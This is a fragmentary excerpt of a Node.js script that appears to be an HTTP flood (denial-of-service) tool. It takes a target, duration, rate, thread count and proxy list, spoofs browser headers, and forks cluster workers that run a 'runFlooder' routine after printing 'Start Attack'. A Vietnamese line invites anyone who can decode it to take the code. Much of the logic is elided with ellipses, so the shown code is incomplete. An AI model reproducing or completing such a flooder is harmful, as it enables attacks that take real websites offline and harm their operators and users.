...
const { HeaderGenerator } = require('header-generator');
 ...
 if (process.argv.length < 7){console.log(`node nammoivuive.js target time rate(32) thread proxy.txt`); process.exit();}
 const headers = {};
...
if (cluster.isMaster){
  ...
  console.log("Start Attack... rapid trash")
...
headers["Referer"] = Ref;
 ...
 function runFlooder() {
    ...
    setTimeout(function(){
      console.log(' năm mới vui vẻ và ai dec đc thì lấy code')
      process.exit(1);
    }, process.argv[3] * 1000);
